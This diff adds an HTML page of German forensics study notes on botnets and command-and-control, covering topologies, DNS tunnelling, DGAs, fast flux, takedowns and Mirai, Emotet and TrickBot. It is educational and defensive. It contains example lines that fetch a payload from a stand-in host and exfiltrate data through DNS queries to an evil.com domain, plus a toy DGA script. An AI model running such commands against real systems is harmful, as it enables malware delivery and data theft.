@@ -1,0 +1,409 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Lernnotizen zur Digitalen Forensik und IT-Security">
+<link rel="canonical" href="https://niccsn.github.io/digital-forensics-notes/">
+<meta property="og:title" content="Botnetze und C2-Architekturen — cosman.dev">
+<meta property="og:type" content="article">
+<meta property="og:site_name" content="cosman.dev">
+<title>Botnetze und C2-Architekturen — cosman.dev</title>
+<link rel="stylesheet" href="../style.css">
+</head>
+<body class="note-page">
+<aside id="sidebar">
+  <div class="sidebar-header">
+    <a href="../index.html" class="logo">DF <span>Field Notes</span></a>
+  </div>
+  <div class="search-box">
+    <input type="text" id="sidebarSearch" placeholder="Notizen durchsuchen..." autocomplete="off">
+    <div class="sb-search-results" id="sidebarSearchResults"></div>
+  </div>
+  <ul class="nav-list nav-home">
+    <li><a href="../index.html">Startseite</a></li>
+    <li><a href="../00-meta/glossary.html">Glossar (A-Z)</a></li>
+  </ul>
+  <ul class="nav-list">
+    <li><details><summary>Grundlagen (10)</summary><ul>
+      <li><a href="../01-grundlagen/zahlensysteme-und-kodierung.html">Zahlensysteme und Kodierung</a></li>
+      <li><a href="../01-grundlagen/rechnerarchitektur-von-neumann.html">Rechnerarchitektur</a></li>
+      <li><a href="../01-grundlagen/algorithmen-und-komplexitaet.html">Algorithmen und Komplexitaet</a></li>
+      <li><a href="../01-grundlagen/datenstrukturen.html">Datenstrukturen</a></li>
+      <li><a href="../01-grundlagen/programmierparadigmen.html">Programmierparadigmen</a></li>
+      <li><a href="../01-grundlagen/python-grundlagen.html">Python-Grundlagen</a></li>
+      <li><a href="../01-grundlagen/oop-klassen-vererbung.html">OOP: Klassen und Vererbung</a></li>
+      <li><a href="../01-grundlagen/softwareentwicklungsprozess.html">Softwareentwicklungsprozess</a>
+      <li><a href="../01-grundlagen/uml-diagramme-softwaremodellierung.html">UML-Diagramme</a></li>
+      <li><a href="../01-grundlagen/software-tests-qualitaetssicherung.html">Software-Tests</a></li>
+      <li><a href="../01-grundlagen/uml-diagramme-softwaremodellierung.html">UML-Diagramme</a></li>
+      <li><a href="../01-grundlagen/software-tests-qualitaetssicherung.html">Software-Tests</a></li>
+    </ul></details></li>
+    <li><details><summary>Betriebssysteme (17)</summary><ul>
+      <li><a href="../02-betriebssysteme/dateisysteme-uebersicht-fat-ntfs-ext4-apfs.html">Dateisysteme</a></li>
+      <li><a href="../02-betriebssysteme/betriebssystem-architekturen.html">BS-Architekturen</a></li>
+      <li><a href="../02-betriebssysteme/prozessmanagement-threads.html">Prozesse und Threads</a></li>
+      <li><a href="../02-betriebssysteme/memory-management.html">Memory Management</a></li>
+      <li><a href="../02-betriebssysteme/linux-administration.html">Linux-Administration</a></li>
+      <li><a href="../02-betriebssysteme/windows-administration.html">Windows-Administration</a></li>
+      <li><a href="../02-betriebssysteme/datentraeger-verschluesselung.html">Datentraeger-Verschluesselung</a></li>
+      <li><a href="../02-betriebssysteme/windows-registry-forensik.html">Registry Forensik</a></li>
+      <li><a href="../02-betriebssysteme/betriebssystem-forensik-spurensuche.html">Spurensuche</a></li>
+      <li><a href="../02-betriebssysteme/file-carving.html">File Carving</a></li>
+      <li><a href="../02-betriebssysteme/embedded-systems-iot-forensik.html">Embedded &amp; IoT</a></li>
+      <li><a href="../02-betriebssysteme/anti-forensik-betriebssystem.html">Anti-Forensik</a></li>
+      <li><a href="../02-betriebssysteme/mobile-forensik-android-ios.html">Mobile Forensik</a></li>
+      <li><a href="../02-betriebssysteme/container-docker-forensik.html">Container &amp; Docker</a></li>
+      <li><a href="../02-betriebssysteme/iot-security-grundlagen.html">IoT-Security</a>
+      <li><a href="../02-betriebssysteme/interprozesskommunikation-io-management.html">IPC <a href="../02-betriebssysteme/iot-security-grundlagen.html">IoT-Security</a>amp; IO-Management</a></li>
+      <li><a href="../02-betriebssysteme/backup-recovery-audit-systeme.html">Backup <a href="../02-betriebssysteme/iot-security-grundlagen.html">IoT-Security</a>amp; Recovery</a></li>
+      <li><a href="../02-betriebssysteme/interprozesskommunikation-io-management.html">IPC &amp; IO</a></li>
+      <li><a href="../02-betriebssysteme/backup-recovery-audit-systeme.html">Backup &amp; Recovery</a></li>
+    </ul></details></li>
+    <li><details><summary>Netzwerke (13)</summary><ul>
+      <li><a href="../03-netzwerke/wireshark-basics-paketanalyse.html">Wireshark Basics</a></li>
+      <li><a href="../03-netzwerke/tcp-ip-protokollfamilie.html">TCP/IP</a></li>
+      <li><a href="../03-netzwerke/ip-adressierung-subnetting.html">IP &amp; Subnetting</a></li>
+      <li><a href="../03-netzwerke/routing-switching-vlans.html">Routing &amp; VLANs</a></li>
+      <li><a href="../03-netzwerke/dhcp-dns-arp.html">DHCP, DNS, ARP</a></li>
+      <li><a href="../03-netzwerke/vpn-und-firewalls.html">VPN &amp; Firewalls</a></li>
+      <li><a href="../03-netzwerke/netzwerkforensik-methoden.html">Netzwerkforensik</a></li>
+      <li><a href="../03-netzwerke/darknet-tor-i2p.html">Darknet &amp; Tor</a></li>
+      <li><a href="../03-netzwerke/web-sicherheit-owasp.html">Web &amp; OWASP</a></li>
+      <li><a href="../03-netzwerke/browser-forensik.html">Browser-Forensik</a></li>
+      <li><a href="../03-netzwerke/tls-ssl-forensik.html">TLS/SSL-Forensik</a></li>
+      <li><a href="../03-netzwerke/wireless-forensik.html">Wireless-Forensik</a>
+      <li><a href="../03-netzwerke/netzwerkmanagement-snmp-monitoring.html">SNMP <a href="../03-netzwerke/wireless-forensik.html">Wireless-Forensik</a>amp; Monitoring</a></li>
+      <li><a href="../03-netzwerke/netzwerkmanagement-snmp-monitoring.html">SNMP &amp; Monitoring</a></li>
+    </ul></details></li>
+    <li><details><summary>Forensik-Methoden (14)</summary><ul>
+      <li><a href="../04-forensik-methoden/forensischer-prozess-chain-of-custody.html">Prozess &amp; Chain of Custody</a></li>
+      <li><a href="../04-forensik-methoden/forensisches-imaging.html">Forensisches Imaging</a></li>
+      <li><a href="../04-forensik-methoden/write-blocker.html">Write-Blocker</a></li>
+      <li><a href="../04-forensik-methoden/datentraeger-forensik.html">Datentraeger-Forensik</a></li>
+      <li><a href="../04-forensik-methoden/arbeitsspeicher-forensik.html">Arbeitsspeicher (Memory)</a></li>
+      <li><a href="../04-forensik-methoden/logfile-analyse.html">Logfile-Analyse</a></li>
+      <li><a href="../04-forensik-methoden/triage-erstanalyse.html">Triage &amp; Erstanalyse</a></li>
+      <li><a href="../04-forensik-methoden/malware-analyse-statisch.html">Malware (Statisch)</a></li>
+      <li><a href="../04-forensik-methoden/malware-analyse-dynamisch.html">Malware (Dynamisch)</a></li>
+      <li><a href="../04-forensik-methoden/forensische-dokumentation.html">Dokumentation</a></li>
+      <li><a href="../04-forensik-methoden/datenbanken-forensik.html">Datenbanken</a></li>
+      <li><a href="../04-forensik-methoden/forensische-live-sicherung.html">Live-Sicherung</a></li>
+      <li><a href="../04-forensik-methoden/cloud-forensik.html">Cloud-Forensik</a>
+      <li><a href="../04-forensik-methoden/botnetze-c2-architekturen.html">Botnetze <a href="../04-forensik-methoden/cloud-forensik.html">Cloud-Forensik</a>amp; C2</a></li>
+      <li><a href="../04-forensik-methoden/botnetze-c2-architekturen.html">Botnetze &amp; C2</a></li>
+    </ul></details></li>
+    <li><details><summary>IT-Security (8)</summary><ul>
+      <li><a href="../05-it-security/schutzziele-cia-triad.html">Schutzziele (CIA)</a></li>
+      <li><a href="../05-it-security/risikoanalyse-threat-modeling.html">Risikoanalyse</a></li>
+      <li><a href="../05-it-security/kryptografie-grundlagen-symmetrisch-asymmetrisch.html">Kryptografie</a></li>
+      <li><a href="../05-it-security/authentifizierung-pki.html">Authentifizierung &amp; PKI</a></li>
+      <li><a href="../05-it-security/kryptoanalyse.html">Kryptoanalyse</a></li>
+      <li><a href="../05-it-security/post-quantum-blockchain.html">Post-Quantum &amp; Blockchain</a></li>
+      <li><a href="../05-it-security/security-incident-management.html">Incident Management</a></li>
+      <li><a href="../05-it-security/siem-und-monitoring.html">SIEM &amp; Monitoring</a></li>
+    </ul></details></li>
+    <li><details><summary>OSINT (5)</summary><ul>
+      <li><a href="../06-osint/osint-lifecycle-und-tooling.html">Lifecycle &amp; Tooling</a></li>
+      <li><a href="../06-osint/osint-recherche-methodik.html">Recherche-Methodik</a></li>
+      <li><a href="../06-osint/osint-anonymisierung-opsec.html">Anonymisierung &amp; OPSEC</a></li>
+      <li><a href="../06-osint/social-media-analyse.html">Social Media</a></li>
+      <li><a href="../06-osint/cybercrime-oekonomie.html">Cybercrime-Oekonomie</a></li>
+    </ul></details></li>
+    <li><details><summary>Recht &amp; Kriminalistik (11)</summary><ul>
+      <li><a href="../07-recht-kriminalistik/digitale-beweismittel-grundprinzipien.html">Digitale Beweismittel</a></li>
+      <li><a href="../07-recht-kriminalistik/strafrecht-allgemeiner-teil.html">Strafrecht AT</a></li>
+      <li><a href="../07-recht-kriminalistik/grundrechte-digital.html">Grundrechte</a></li>
+      <li><a href="../07-recht-kriminalistik/dsgvo-datenschutz.html">DSGVO</a></li>
+      <li><a href="../07-recht-kriminalistik/kriminalistik-grundlagen.html">Kriminalistik</a></li>
+      <li><a href="../07-recht-kriminalistik/tatortarbeit-spurenkunde.html">Tatort &amp; Spurenkunde</a></li>
+      <li><a href="../07-recht-kriminalistik/eingriffsrecht-tkue.html">Eingriffsrecht TKUe</a></li>
+      <li><a href="../07-recht-kriminalistik/ethik-informationssicherheit.html">Ethik</a></li>
+      <li><a href="../07-recht-kriminalistik/juristische-fallbearbeitung-gutachtenstil.html">Gutachtenstil</a>
+      <li><a href="../07-recht-kriminalistik/quellen-tkue-online-durchsuchung.html">Quellen-TKUe</a></li>
+      <li><a href="../07-recht-kriminalistik/urheberrecht-immaterialgueterrecht-digital.html">Urheberrecht</a></li>
+      <li><a href="../07-recht-kriminalistik/quellen-tkue-online-durchsuchung.html">Quellen-TKÜ</a></li>
+      <li><a href="../07-recht-kriminalistik/urheberrecht-immaterialgueterrecht-digital.html">Urheberrecht</a></li>
+    </ul></details></li>
+    <li><details><summary>KI &amp; Forensik (5)</summary><ul>
+      <li><a href="../08-ki-forensik/llms-in-der-forensischen-analyse.html">LLMs in der Analyse</a></li>
+      <li><a href="../08-ki-forensik/ki-grundlagen-ml-overview.html">ML Overview</a></li>
+      <li><a href="../08-ki-forensik/neuronale-netze-deep-learning.html">Neuronale Netze</a></li>
+      <li><a href="../08-ki-forensik/decision-trees-klassifikation.html">Decision Trees</a></li>
+      <li><a href="../08-ki-forensik/bildforensik-objekterkennung.html">Bildforensik &amp; YOLO</a></li>
+    </ul></details></li>
+  </ul>
+  <ul class="nav-list">
+    <li><details><summary>Tools &amp; Referenzen</summary><ul>
+      <li><a href="../09-tools/ip-log-analyzer/README.html">IP Log Analyzer</a></li>
+      <li><a href="../09-tools/registry-parser/README.html">Registry Parser</a></li>
+      <li><a href="../00-meta/glossary.html">Glossar (A-Z)</a></li>
+      <li><a href="../INDEX.html">Themen-Index</a></li>
+      <li><a href="https://github.com/NicCsn/digital-forensics-notes">GitHub</a></li>
+    </ul></details></li>
+  </ul>
+</aside>
+<div class="note-wrapper">
+<nav class="top-nav">
+  <a href="https://cosman.dev" class="home-link">cosman.dev</a>
+  <span class="nav-crumb">/ <a href="../index.html#cat-forensik">Forensik-Methoden</a> / Botnetze</span>
+</nav>
+<main>
+<article>
+<h1>Botnetze und C2-Architekturen <span class="diff-badge diff-advanced">Fortgeschritten</span></h1>
+<details class="fold"><summary>Inhaltsverzeichnis</summary><ol>
+  <li><a href="#kurz-berblick">Kurzüberblick</a></li>
+  <li><a href="#topologien">Botnetz-Topologien: Zentralisiert, Dezentralisiert, Hybrid</a></li>
+  <li><a href="#c2-protokolle">C2-Protokolle: IRC, HTTP/HTTPS, DNS-Tunnel, Social Media</a></li>
+  <li><a href="#dga">Domain Generation Algorithm (DGA)</a></li>
+  <li><a href="#fast-flux">Fast Flux: Single und Double</a></li>
+  <li><a href="#takedown">Takedown-Strategien</a></li>
+  <li><a href="#forensische-untersuchung">Forensische Untersuchung</a></li>
+  <li><a href="#beruehmte-beispiele">Beruhmte Beispiele: Mirai, Emotet, TrickBot</a></li>
+  <li><a href="#quellen-weiterf-hrendes">Quellen / Weiterfuhrendes</a></li>
+</ol></details>
+
+<h2 id="kurz-berblick">Kurzüberblick</h2>
+
+<p>Ein Botnetz ist ein Netzwerk aus kompromittierten Rechnern (Bots, Zombies), die von einem Angreifer (Botmaster) uber eine Command-and-Control-Infrastruktur (C2) ferngesteuert werden. Botnetze sind die Infrastruktur hinter den meisten grossen Cyberangriffen: DDoS-Attacken (Mirai), Bankentrojaner (Emotet), Ransomware-Verteilung (TrickBot) und Spam-Kampagnen. Fur Forensiker ist das Verstandnis von Botnetz-Architekturen essenziell, um Befall zu erkennen, C2-Kommunikation zu identifizieren und an Takedowns mitzuwirken.</p>
+
+<p>MHB-Mapping: BDF306 (Forensik-Methoden) — Analyse fortgeschrittener Angriffsinfrastrukturen und Botnetz-Forensik.</p>
+
+<h2 id="topologien">Botnetz-Topologien: Zentralisiert, Dezentralisiert, Hybrid</h2>
+
+<h3>Zentralisiert (Client-Server)</h3>
+<p>Alle Bots kommunizieren mit einem oder wenigen zentralen C2-Servern. Der Botmaster sendet Befehle uber diesen Server an alle Bots. Einfach zu implementieren, aber Single Point of Failure: Wird der C2-Server abgeschaltet, ist das gesamte Botnetz lahmgelegt.</p>
+
+<pre><code># Beispiel: IRC-basiertes Botnetz (einfache Struktur)
+# Alle Bots joinen einen IRC-Channel und warten auf Befehle
+Bot1 ─┐
+Bot2 ─┼── IRC-Server (C2) ── Botmaster
+Bot3 ─┘    channel: #botnet
+           Befehle: .attack 10.0.0.1, .update http://malware.net/v2.exe</code></pre>
+
+<h3>Dezentralisiert (P2P)</h3>
+<p>Bots kommunizieren untereinander ohne zentralen Server. Jeder Bot ist gleichzeitig Client und Server. Befehle werden per Gossip-Protokoll verbreitet. Extrem resilient: Es gibt keinen zentralen Abschaltpunkt. Beispiel: Storm Worm (2007), der ein Overnet-basiertes P2P-Protokoll nutzte.</p>
+
+<table>
+<thead><tr><th>Eigenschaft</th><th>Zentralisiert</th><th>P2P / Dezentralisiert</th></tr></thead><tbody>
+<tr><td><strong>Ausfallsicherheit</strong></td><td>Niedrig (Single Point of Failure)</td><td>Hoch (kein zentraler Punkt)</td></tr>
+<tr><td><strong>Latenz (Befehl → Ausfuhrung)</strong></td><td>Niedrig (direkter Befehl)</td><td>Hoch (Gossip-Propagation dauert)</td></tr>
+<tr><td><strong>Entdeckbarkeit</strong></td><td>Leicht (C2-IP/-Domain identifizierbar)</td><td>Schwer (keine singulare IP/Domain)</td></tr>
+<tr><td><strong>Implementierungskomplexitat</strong></td><td>Niedrig</td><td>Hoch (Peer-Discovery, NAT-Traversal, Routing)</td></tr>
+<tr><td><strong>Forensische Takedown-Moglichkeit</strong></td><td>Sinkhole, Domain-Seizure moglich</td><td>Peer-Poisoning, Sybil-Angriff nötig</td></tr>
+</tbody></table>
+
+<h3>Hybride Topologien</h3>
+<p>Kombination aus zentralisierten und P2P-Elementen. Beispiel: Bots haben eine feste Liste von "Super-Peers", die als C2-Relais fungieren. Fallen Super-Peers aus, wechseln Bots zu DGA-basiertem Fallback. Hybride Architekturen sind der heutige Standard fur professionelle Malware.</p>
+
+<h2 id="c2-protokolle">C2-Protokolle: IRC, HTTP/HTTPS, DNS-Tunnel, Social Media</h2>
+
+<table>
+<thead><tr><th>Protokoll</th><th>Erkennungsmerkmal</th><th>Tarntechnik</th><th>Forensische Spur</th></tr></thead><tbody>
+<tr><td><strong>IRC</strong></td><td>TCP/6667, NICK/PRIVMSG-Kommandos</td><td>Benutzerdefinierte Channels, verschlusselte PRIVMSG</td><td>IRC-Logs auf C2-Server, PCAP-Analyse auf Client</td></tr>
+<tr><td><strong>HTTP/HTTPS</strong></td><td>HTTP POST zu /gate.php, User-Agent-Anomalien</td><td>GET-Anfragen als Beacon; POST-Daten Base64 + AES</td><td>Proxy-Logs, HTTP-Header, JA3/JA4-Fingerprints</td></tr>
+<tr><td><strong>DNS-Tunnel</strong></td><td>Ungewohnlich lange Subdomains, hohes DNS-Volumen, TXT-Records</td><td>C2-Daten in DNS-Queries kodiert; Antwort in TXT-Records</td><td>DNS-Logs (NXDOMAIN-Analyse), IPFIX-Daten</td></tr>
+<tr><td><strong>Social Media</strong></td><td>Twitter-API-Calls, Telegram-Bot-API-Requests</td><td>Legitime API-Nutzung; C2-Befehle als Tweets/Kanal-Nachrichten</td><td>API-Schlussel in Malware-Config; Account-Forensik</td></tr>
+</tbody></table>
+
+<h3>DNS-Tunnel im Detail</h3>
+<pre><code># Typischer DNS-Tunnel fur C2: Daten-Exfiltration via DNS-Query
+# Bot verschlusselt Daten und sendet sie als Subdomain:
+nslookup AES-VERSCHLUESSELTE-DATEN.c2-server.evil.com
+
+# Antwort des C2-Servers als TXT-Record (enthalt Befehle):
+;; ANSWER SECTION:
+bot1-42.c2-server.evil.com. 60 IN TXT "BASE64-BEFEHL"
+
+# Forensische Erkennung:
+#   — Ungewohnliche Subdomain-Lange (> 50 Zeichen)
+#   — Hohe Anzahl von DNS-Queries zu einer Domain
+#   — TXT-Record-Anfragen an eine Domain, die sonst nur A/AAAA verwendet
+#   — DNS-Volumen korreliert nicht mit HTTP-Traffic (reiner DNS-Tunnel)</code></pre>
+
+<div class="callout warning"><strong>Forensische Herausforderung:</strong> DNS-Tunnel sind schwer zu blockieren, weil DNS (UDP/53) in fast jedem Netzwerk offen sein muss. Viele Firewalls inspizieren keine DNS-Payloads. Fur die forensische Erkennung sind DNS-Logs und NXDOMAIN-Tracking die primaren Quellen — PCAPs sind bei DNS-over-HTTPS (DoH) wirkungslos.</div>
+
+<h3>Social Media als C2-Kanal</h3>
+<p>Moderne Malware nutzt legitime Plattformen: Ein Telegram-Bot empfangt Befehle uber die Bot-API. Der Traffic ist nicht als bösartig erkennbar, weil er zu api.telegram.org geht — eine legitime, weit verbreitete Domain. Forensische Indizien sind nur lokal zu finden: die Bot-API-Keys in der Malware-Config-Datei oder im Speicherabbild.</p>
+
+<h2 id="dga">Domain Generation Algorithm (DGA)</h2>
+
+<p>Ein DGA generiert täglich dutzende oder hunderte pseudozufallige Domanennamen algorithmisch. Bot und Botmaster kennen den Algorithmus und den Seed (z.B. aktuelles Datum, Twitter-Trends). Der Botmaster registriert nur eine der generierten Domains als C2-Server. Bots probieren alle Domanen durch, bis sie die registrierte finden.</p>
+
+<h3>DGA-Funktionsweise</h3>
+<pre><code># Vereinfachter DGA in Python (demonstrativ, nicht aus echter Malware)
+import hashlib
+from datetime import date
+
+def generate_domains(year, month, day, count=10):
+    seed = f"malware-v2-{year}-{month}-{day}"
+    domains = []
+    for i in range(count):
+        h = hashlib.sha256(f"{seed}-{i}".encode()).hexdigest()
+        domain = h[:12] + ".com"  # 12 Zeichen aus dem Hash
+        domains.append(domain)
+    return domains
+
+# Am 4. Juli 2026 generiert der DGA:
+print(generate_domains(2026, 7, 4))
+# ['a3b7c9d1e2f3.com', '4c8d1e5f9a2b.com', ...]</code></pre>
+
+<h3>DGA-Erkennung</h3>
+<table>
+<thead><tr><th>Methode</th><th>Beschreibung</th><th>Effektivitat</th></tr></thead><tbody>
+<tr><td><strong>Entropie-Analyse</strong></td><td>Zufallige Domain-Namen haben hohe Zeichen-Entropie (Shannon-Entropy > 3.5)</td><td>Gut gegen Algorithmen, die reine Zufallsstrings produzieren</td></tr>
+<tr><td><strong>NXDOMAIN-Tracking</strong></td><td>Viele NXDOMAIN-Antworten von einem Client = verdachtig (DGA probing)</td><td>Sehr gut; ein infizierter Client produziert viele nicht-existente Domain-Lookups</td></tr>
+<tr><td><strong>N-Gramm-Analyse</strong></td><td>Worterbuch-basierte Domain-Namen haben erkennbare Sprachmuster; DGA-Domains nicht</td><td>Gut gegen zufallsbasierte und worterbuchbasierte DGA-Varianten</td></tr>
+<tr><td><strong>Machine Learning</strong></td><td>Klassifikatoren (Random Forest, LSTM) auf Features: Domain-Lange, Vokal/Konsonant-Ratio, Bigram-Haufigkeiten</td><td>Hoch, aber erfordert Training auf bekannten DGA-Familien; Generalisierung auf neue Familien problematisch</td></tr>
+</tbody></table>
+
+<div class="callout info"><strong>Forensische Praxis:</strong> Ein Client, der innerhalb von 5 Minuten 50 verschiedene, nicht-existente .com-Domains anfragt, ist mit hoher Wahrscheinlichkeit Teil eines DGA-basierten Botnetzes. Korrelieren Sie die DNS-Logs mit Prozesslisten (welcher Prozess lost diese Domain auf?) und Netzwerkverbindungen (welche IP antwortet auf die erfolgreiche Auflosung?).</div>
+
+<h2 id="fast-flux">Fast Flux: Single und Double</h2>
+
+<p>Fast Flux tauscht die IP-Adressen hinter einer Domain in sehr kurzen Abstanden aus (TTL oft < 300 Sekunden). DNS-Anfragen auf dieselbe Domain liefern wechselnde IPs — ein Netzwerk aus kompromittierten Rechnern fungiert als Proxy-Flotte.</p>
+
+<table>
+<thead><tr><th>Typ</th><th>Single Flux</th><th>Double Flux</th></tr></thead><tbody>
+<tr><td><strong>Prinzip</strong></td><td>Nur A-Records wechseln; NS-Records sind statisch</td><td>A-Records UND NS-Records wechseln; auch die Nameserver sind Teil des Botnetzes</td></tr>
+<tr><td><strong>Abschaltbarkeit</strong></td><td>NS-Records zeigen auf legitimen Registrar; Domain kann per Registrar-Seizure abgeschaltet werden</td><td>NS-Records wechseln ebenfalls; kein einzelner Registrar als Angriffspunkt</td></tr>
+<tr><td><strong>Forensische Gegenmassnahme</strong></td><td>Domain-Sperrung beim Registrar (Court Order)</td><td>IP-Blocking (ineffektiv wegen Rotation); Sinkhole der NS-Infrastruktur</td></tr>
+</tbody></table>
+
+<h3>Bulletproof Hosting und Proxy-Dienste</h3>
+<p>Bulletproof Hosting sind Hosting-Anbieter, die bewusst illegale Inhalte tolerieren und auf Abuse-Meldungen nicht reagieren. Haufig in Jurisdiktionen mit schwacher Rechtsdurchsetzung (z.B. bestimmte osteuropaische Lander, Offshore-Islands). Proxy-Dienste (Residential Proxies, Rotating Proxies) verschleiern die wahre Herkunft des Traffics: C2-Traffic erscheint dann von tausenden privaten Internetanschlussen zu kommen — nahezu unmoglich zu blockieren, ohne legitime Nutzer zu beeintrachtigen.</p>
+
+<h2 id="takedown">Takedown-Strategien</h2>
+
+<table>
+<thead><tr><th>Strategie</th><th>Technik</th><th>Beispiel</th><th>Wirksamkeit</th></tr></thead><tbody>
+<tr><td><strong>Sinkhole</strong></td><td>C2-Domain auf einen kontrollierten Server umleiten (via DNS/Registrar). Bots verbinden sich mit dem Sinkhole statt mit dem echten C2.</td><td>Shadowserver Foundation sinkholed Avalanche-Botnetz (2016, 500.000+ infizierte IPs)</td><td>Sehr effektiv bei zentralisierten C2; meldet Infektionen an ISPs</td></tr>
+<tr><td><strong>Domain-Seizure</strong></td><td>Beschlagnahmung der C2-Domain durch Strafverfolgungsbehorden uber den Registrar.</td><td>FBI + Europol: Emotet-Takedown Januar 2021 — koordinierte Seizure von Hunderten C2-Servern</td><td>Effektiv bei bekannter Domain; nicht bei DGA-basierten Botnetzen</td></tr>
+<tr><td><strong>Peer-Poisoning</strong></td><td>Einschleusen von kontrollierten Peers in das P2P-Netzwerk, die falsche Befehle oder fehlerhafte Peer-Listen verbreiten.</td><td>BKA-Trojaner / Bundestrojaner-Diskussion; ethisch und rechtlich umstritten</td><td>Theoretisch effektiv gegen P2P; rechtliche Hurden und Kollateralschaden</td></tr>
+<tr><td><strong>Bulletproof-Hosting-Takedown</strong></td><td>Physische Beschlagnahmung von Servern in Rechenzentren; internationale Rechtshilfe.</td><td>Avalanche-Takedown (2016) — koordinierte Razzien in 30+ Landern</td><td>Aufwandig, aber nachhaltig; erfordert internationale Zusammenarbeit</td></tr>
+</tbody></table>
+
+<h2 id="forensische-untersuchung">Forensische Untersuchung</h2>
+
+<h3>Beaconing erkennen</h3>
+<p>Beaconing ist das regelmassige "Nach-Hause-Telefonieren" eines Bots zum C2-Server. Charakteristisch: periodische Verbindungen (z.B. alle 60 Sekunden, alle 5 Minuten) mit ahnlicher Payload-Grosse und gleichem Ziel. NetFlow- oder PCAP-Daten zeigen diese Periodizitat als klare Signatur.</p>
+
+<pre><code># Beacon-Erkennung mit Zeek (ehemals Bro): Analyse von Verbindungsintervallen
+event connection_state_remove(c: connection)
+{
+    local interval = c$duration;
+    local bytes_sent = c$orig$num_bytes_ip;
+    # Wenn ein Host alle 60–300 Sekunden zum gleichen Ziel verbindet,
+    # mit ahnlicher Byte-Zahl → Beacon-Alarm
+}</code></pre>
+
+<h3>DNS-Log-Analyse auf Botnetz-Indizien</h3>
+<ol>
+  <li><strong>Hohes NXDOMAIN-Aufkommen:</strong> Ein Client produziert > 50 NXDOMAIN-Antworten pro Stunde → potenzieller DGA-Bot</li>
+  <li><strong>DDNS-Domains:</strong> C2-Server nutzen oft Dynamic-DNS-Dienste (z.B. duckdns.org, no-ip.com) — prufen Sie alle DDNS-Lookups</li>
+  <li><strong>NXDOMAIN + erfolgreiche Auflosung:</strong> Nach 49 NXDOMAIN-Antworten erfolgt eine erfolgreiche Auflosung — DGA-Treffer!</li>
+</ol>
+
+<h2 id="beruehmte-beispiele">Beruhmte Beispiele: Mirai, Emotet, TrickBot</h2>
+
+<h3>Mirai (2016) — IoT-Botnetz</h3>
+<p>Infizierte IoT-Gerate (Kameras, Router, DVRs) uber Telnet mit Default-Passwortern. C2 war zentralisiert uber einen einzelnen C2-Server und einen Loader-Server. Beruhmt fur den DDoS-Angriff auf DynDNS (Oktober 2016), der grosse Teile des Internets (Twitter, Netflix, GitHub) lahmlegte. Forensische Lehre: IoT-Gerate haben keine Logs, keine IDS, keine forensischen Artefakte — die gesamte Analyse musste netzwerkseitig erfolgen.</p>
+
+<h3>Emotet (2014–2021) — Banking-Trojaner / Malware-Loader</h3>
+<p>Begann als Banking-Trojaner (Man-in-the-Browser), entwickelte sich zum modularen Malware-Loader: Emotet infizierte Systeme und lud dann andere Malware nach (TrickBot, Ryuk-Ransomware). C2-Architektur: mehrstufiges HTTP/HTTPS mit hunderten wechselnden Proxies. Takedown im Januar 2021 durch Europol/FBI: koordinierte Beschlagnahmung von 700+ C2-Servern in 12 Landern.</p>
+
+<h3>TrickBot (2016–2022) — Modularer Banking-Trojaner</h3>
+<p>Modulares Framework: Kernmodul fur C2-Kommunikation, Erweiterungsmodule fur Credential-Theft, Lateral Movement, Ransomware-Deployment. C2-Architektur: mehrschichtiges HTTPS mit wechselnden Server-IPs und Domain-Rotation. Forensische Analyse zeigte verschlusselte Konfigurationsdateien (mit Gruppennamen wie "gct15", "libusd3") und eine ausgefeilte Anti-Analyse-Logik.</p>
+
+<div class="callout tip"><strong>Forensischer Ansatz bei Botnetz-Verdacht:</strong> 1. Memory-Dump des verdachtigen Systems (Volatility: netscan, malfind). 2. PCAP/NetFlow-Daten der letzten 30 Tage vom Perimeter extrahieren. 3. DNS-Logs auf NXDOMAIN, DDNS und DGA-Muster analysieren. 4. Malware-Konfiguration aus dem Binary extrahieren (C2-Adressen, Keys, ID). 5. Threat-Intelligence-Plattformen (VirusTotal, AlienVault OTX) nach den extrahierten IOCs abfragen.</div>
+
+<h2 id="quellen-weiterf-hrendes">Quellen / Weiterfuhrendes</h2>
+<ul>
+  <li>Antonakakis et al.: "Understanding the Mirai Botnet" — USENIX Security 2017</li>
+  <li>Plohmann et al.: "A Comprehensive Measurement Study of Domain Generating Malware" — USENIX Security 2016</li>
+  <li>Europol: "World's most dangerous malware EMOTET disrupted" — Januar 2021</li>
+  <li>HoneyNet Project: "Know Your Enemy: Tracking Botnets" (2005) — Klassiker, immer noch relevant</li>
+  <li>MITRE ATT&CK: T1568 (Dynamic Resolution), T1571 (Non-Standard Port), T1090 (Proxy)</li>
+  <li>RFC 1035 (DNS), RFC 1459 (IRC), RFC 7230 (HTTP/1.1) — relevante Protokollstandards</li>
+</ul>
+
+<div class="related-notes">
+  <strong>Verwandte Notizen</strong>
+  <div class="related-grid">
+    <a href="malware-analyse-statisch.html">Malware-Analyse (Statisch)</a>
+    <a href="malware-analyse-dynamisch.html">Malware-Analyse (Dynamisch)</a>
+    <a href="logfile-analyse.html">Logfile-Analyse</a>
+    <a href="../03-netzwerke/netzwerkforensik-methoden.html">Netzwerkforensik</a>
+    <a href="../03-netzwerke/darknet-tor-i2p.html">Darknet, Tor, I2P</a>
+    <a href="../06-osint/cybercrime-oekonomie.html">Cybercrime-Okonomie</a>
+    <a href="../05-it-security/security-incident-management.html">Incident Management</a>
+  </div>
+</div>
+
+<nav class="prev-next" id="prevNextNav"></nav>
+
+</article>
+</main>
+<footer class="page-footer">
+  <a href="https://github.com/NicCsn/digital-forensics-notes">GitHub</a> &middot; <a href="../00-meta/glossary.html">Glossar</a> &middot; <a href="../INDEX.html">Index</a>
+</footer>
+</div>
+<button id="back-to-top" title="Nach oben">↑</button>
+<script src="../nav-order.js"></script>
+<script src="../search.js"></script>
+<script>
+(function(){
+  var inp = document.getElementById('sidebarSearch');
+  var res = document.getElementById('sidebarSearchResults');
+  if (!inp || !res) return;
+  function findNotes(q) {
+    q = q.toLowerCase();
+    var out = [];
+    for (var i = 0; i < notes.length; i++) {
+      var n = notes[i], score = 0;
+      if (n.t.toLowerCase().indexOf(q) !== -1) score += 10;
+      if (n.f.toLowerCase().indexOf(q) !== -1) score += 5;
+      for (var j = 0; j < n.g.length; j++) {
+        if (n.g[j].toLowerCase().indexOf(q) !== -1) score += 3;
+      }
+      if (score > 0) out.push({n:n, s:score});
+    }
+    out.sort(function(a,b){return b.s - a.s;});
+    return out;
+  }
+  inp.addEventListener('input', function() {
